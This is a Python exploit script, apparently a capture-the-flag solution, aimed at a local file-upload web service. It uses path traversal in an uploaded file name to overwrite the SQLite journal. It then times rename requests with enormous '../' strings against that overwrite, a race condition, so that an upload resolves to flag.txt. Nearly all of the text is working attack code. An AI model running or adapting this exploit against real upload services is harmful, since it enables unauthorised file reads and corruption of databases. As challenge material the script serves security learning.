import requests
import threading
import time

base_url = "http://127.0.0.1:5000"

def overwrite_db():
    for i in range(10):
        try:
            requests.post(base_url + '/upload', 
                          files={'file': ('../database.sqlite-journal', "")}, 
                          allow_redirects=False, 
                          timeout=0.5)
        except:
            pass

def do_rename(uuid):
    start_time = time.time()
    requests.post(base_url + f'/rename/{uuid}', 
                  json={'new_filename': 'a/a/a/a/aa/'+'../aa/a/../'*1839296 +'../.././../'*2+ './a/../././'*2000000 +'/upl/ads'})
    end_time = time.time()
    print("Elapsed time for rename:", end_time - start_time)

# Upload file
result = requests.post(base_url + '/upload', files={'file': ('test1', "")}, allow_redirects=False).text
print(result)
uuid = result.split('uploads/')[1].split('"')[0]

# Rename file into a very long path

start_time = time.time()
requests.post(base_url + f'/rename/{uuid}', 
              json={'new_filename': 'uploadu/../'*3839299+'flag.txt'}, 
              allow_redirects=False)
end_time = time.time()
print("Elapsed time for rename:", end_time - start_time)

# Test exploit changing delay between one request to the other
base_delay = end_time - start_time - 0.5
for i in range(100):
    delay = i/10 + base_delay
    print("DELAY:",delay)

    # Do file rename of same length
    t1 = threading.Thread(target=do_rename, args=(uuid,))

    # Clear the database journal
    t2 = threading.Thread(target=overwrite_db)

    t1.start()
    time.sleep(delay)
    t2.start()

    t1.join()
    t2.join()

    # Read file and check if it is pointing to the flag
    res = requests.get(base_url + f'/uploads/{uuid}').text

    if res!="":
        print("FLAG FOUND:", res)
        break

    time.sleep(2)

